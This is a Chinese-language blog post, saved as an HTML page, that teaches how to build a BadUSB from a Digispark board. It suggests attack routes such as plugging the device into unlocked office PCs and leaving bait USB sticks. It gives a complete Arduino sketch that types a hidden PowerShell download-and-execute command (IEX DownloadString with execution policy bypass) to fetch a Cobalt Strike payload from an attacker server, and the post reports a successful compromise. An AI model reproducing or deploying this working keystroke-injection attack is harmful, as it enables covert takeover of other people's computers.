@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="原理&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;不同于老式的U盘病毒，它利用了USB协议中的一个漏洞，通过模拟键盘、鼠标、网卡等从而让目标电脑执行恶意代码，达到控住主机或者窃取敏感信息等目的。 &amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;利用了HID界面和相关协议，在代码层级模拟键盘或者鼠标的操作，达到恶意传播病毒或者删除关键文件的目的。 &amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;恶">
+<meta property="og:type" content="article">
+<meta property="og:title" content="badusb制作">
+<meta property="og:url" content="https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/index.html">
+<meta property="og:site_name" content="sh1y1n9aI&#39;s blog">
+<meta property="og:description" content="原理&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;不同于老式的U盘病毒，它利用了USB协议中的一个漏洞，通过模拟键盘、鼠标、网卡等从而让目标电脑执行恶意代码，达到控住主机或者窃取敏感信息等目的。 &amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;利用了HID界面和相关协议，在代码层级模拟键盘或者鼠标的操作，达到恶意传播病毒或者删除关键文件的目的。 &amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;恶">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001174746620.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001174856995.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001174912387.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001174932215.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001175024665.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001175050708.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001175110135.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001175157105.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001175217975.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001175240333.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001175320214.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001175339032.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20231001175352585.png">
+<meta property="article:published_time" content="2023-10-01T08:49:09.000Z">
+<meta property="article:modified_time" content="2023-10-01T10:01:13.635Z">
+<meta property="article:author" content="sh1y1n9aI">
+<meta property="article:tag" content="嵌入式">
+<meta property="article:tag" content="Ardunio IDE">
+<meta property="article:tag" content="badusb">
+<meta property="article:tag" content="Digispark">
+<meta property="article:tag" content="硬件安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sh1y1n9ai.github.io/images/image-20231001174746620.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>badusb制作</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="sh1y1n9aI&#39;s blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/10/01/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&text=badusb制作"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&is_video=false&description=badusb制作"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=badusb制作&body=Check out this article: https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&name=badusb制作&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&t=badusb制作"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%AD%E4%B9%B0%E9%80%94%E5%BE%84"><span class="toc-number">3.</span> <span class="toc-text">购买途径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9Cbadusb"><span class="toc-number">4.</span> <span class="toc-text">制作badusb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        badusb制作
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">sh1y1n9aI</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-01T08:49:09.000Z" class="dt-published" itemprop="datePublished">2023-10-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">硬件安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Ardunio-IDE/" rel="tag">Ardunio IDE</a>, <a class="p-category" href="/tags/Digispark/" rel="tag">Digispark</a>, <a class="p-category" href="/tags/badusb/" rel="tag">badusb</a>, <a class="p-category" href="/tags/%E5%B5%8C%E5%85%A5%E5%BC%8F/" rel="tag">嵌入式</a>, <a class="p-category" href="/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/" rel="tag">硬件安全</a>
+    </div>
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>&ensp;&ensp;&ensp;&ensp;不同于老式的U盘病毒，它利用了USB协议中的一个漏洞，通过模拟键盘、鼠标、网卡等从而让目标电脑执行恶意代码，达到控住主机或者窃取敏感信息等目的。</p>
+<p>&ensp;&ensp;&ensp;&ensp;利用了HID界面和相关协议，在代码层级模拟键盘或者鼠标的操作，达到恶意传播病毒或者删除关键文件的目的。</p>
+<p>&ensp;&ensp;&ensp;&ensp;<strong>恶意代码存在于U盘的固件中，PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法防御BadUSB的攻击</strong>。</p>
+<p><strong>硬件设备（Digispark开发板）</strong></p>
+<p>&ensp;&ensp;&ensp;&ensp;基于ATTINY85微控制器的USB开发板，体积小且价钱便宜，功能方面则没有Arduino般强大。 代码与Arduino大同小异，更可贵的是<strong>使用Arduino IDE来开发</strong>。</p>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><ol>
+<li>物理入侵，简单点找一些未锁屏的办公电脑挨个插入。</li>
+<li>U盘钓鱼，通过伪装成一个普通移动U盘撒向目标范围内引起目标注意。</li>
+<li>摆渡攻击，通常是攻击局域网内部系统，当再次插入互联网设备中敏感信息被传输。</li>
+</ol>
+<h3 id="购买途径"><a href="#购买途径" class="headerlink" title="购买途径"></a>购买途径</h3><p>某宝上直接就能购买，我买的是Digispark开发板</p>
+<p><img src="/../images/image-20231001174746620.png" alt="image-20231001174746620"></p>
+<h3 id="制作badusb"><a href="#制作badusb" class="headerlink" title="制作badusb"></a>制作badusb</h3><p>&ensp;&ensp;&ensp;&ensp;下载Arduino IDE，安装驱动：<a target="_blank" rel="noopener" href="https://github.com/digistump/DigistumpArduino/releases">https://github.com/digistump/DigistumpArduino/releases</a> </p>
+<p> （因为我的板子是Digispark开发板，Arduino IDE默认不支持该板子，需要下载对应的驱动）</p>
+<p><img src="/../images/image-20231001174856995.png" alt="image-20231001174856995"></p>
+<p>选择64位，进行安装</p>
+<p><img src="/../images/image-20231001174912387.png" alt="image-20231001174912387"></p>
+<p>确保所有驱动都勾选上，进行安装；安装好后，重启电脑</p>
+<p><img src="/../images/image-20231001174932215.png" alt="image-20231001174932215"></p>
+<p>打开Arduino IDE，先配置代理，避免后续因为下载问题</p>
+<p><img src="/../images/image-20231001175024665.png" alt="image-20231001175024665"></p>
+<p>&ensp;&ensp;&ensp;&ensp;打开偏好设置，附加开发板管理器网址：<a target="_blank" rel="noopener" href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json</a> 	（因为Ardunio IDE默认没有Digispark开发板，需要手动添加）</p>
+<p><img src="/../images/image-20231001175050708.png" alt="image-20231001175050708"></p>
+<p>打开开发板管理器，选择安装 Digistump AVR Boards</p>
+<p><img src="/../images/image-20231001175110135.png" alt="image-20231001175110135"></p>
+<p>安装好后，就可以选择Digispark板子了</p>
+<p><img src="/../images/image-20231001175157105.png" alt="image-20231001175157105"></p>
+<p>选择example中的keyboard案例</p>
+<p><img src="/../images/image-20231001175217975.png" alt="image-20231001175217975"></p>
+<p>利用CS生成powershell脚本来上线，并把powershell脚本托管到服务器上</p>
+<p><img src="/../images/image-20231001175240333.png" alt="image-20231001175240333"></p>
+<p>需要烧制到板子上的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;DigiKeyboard.h&quot;</span><br><span class="line">#define KEY_ESC 41</span><br><span class="line">#define KEY_BACKSPACE 42</span><br><span class="line">#define KEY_TAB 43</span><br><span class="line">#define KEY_PRT_SCR 70</span><br><span class="line">#define KEY_DELETE 76</span><br><span class="line"> </span><br><span class="line">void setup() &#123;</span><br><span class="line">  DigiKeyboard.delay(5000);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(0);</span><br><span class="line">  DigiKeyboard.delay(3000);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">  DigiKeyboard.delay(1000);</span><br><span class="line">  DigiKeyboard.print(F(&quot;powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://xx.xx.xx.xx/payload.ps1&#x27;);&quot;));</span><br><span class="line">  DigiKeyboard.delay(500);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">  DigiKeyboard.delay(750);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改payload脚本的地址即可，直接点击上传，提示需要60秒内插入板子</p>
+<p><img src="/../images/image-20231001175320214.png" alt="image-20231001175320214"></p>
+<p>插入板子，写入成功</p>
+<p><img src="/../images/image-20231001175339032.png" alt="image-20231001175339032"></p>
+<p>把badusd重新插入到电脑上，机器成功上线</p>
+<p><img src="/../images/image-20231001175352585.png" alt="image-20231001175352585"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>&ensp;&ensp;&ensp;&ensp;在 Arduino 开发环境中，使用开发板管理器可以轻松安装和管理各种硬件平台的支持，包括不同的微控制器和开发板。默认情况下，Arduino IDE 附带一些常见的开发板支持，但对于其他特定的开发板或微控制器，可能需要添加附加的开发板支持。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li>参考视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av18699066">https://www.bilibili.com/video/av18699066</a></li>
+<li>驱动下载地址：<a target="_blank" rel="noopener" href="https://github.com/digistump/DigistumpArduino/releases">https://github.com/digistump/DigistumpArduino/releases</a></li>
+<li>Arduino IDE代码生成器：<a target="_blank" rel="noopener" href="https://github.com/Catboy96/Automator">https://github.com/Catboy96/Automator</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%AD%E4%B9%B0%E9%80%94%E5%BE%84"><span class="toc-number">3.</span> <span class="toc-text">购买途径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9Cbadusb"><span class="toc-number">4.</span> <span class="toc-text">制作badusb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&text=badusb制作"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&is_video=false&description=badusb制作"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=badusb制作&body=Check out this article: https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&name=badusb制作&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sh1y1n9ai.github.io/2023/10/01/badusb%E5%88%B6%E4%BD%9C/&t=badusb制作"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2023
+    sh1y1n9aI
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--  
+        <li><a href="/">首页</a></li>
+        
+        <li><a href="/archives/">归档</a></li>
+        
+        <li><a href="/categories/">分类</a></li>
+        
+        <li><a href="/tags/">标签</a></li>
+        
+        <li><a href="/search/">搜索</a></li>
+        
+        <li><a href="/about/">关于</a></li>
+          -->
+
+        
+              <!-- 不蒜子统计 -->
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <!--  <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>  -->
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?09589470e358e72a59d6b6a6a3fb6afc";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
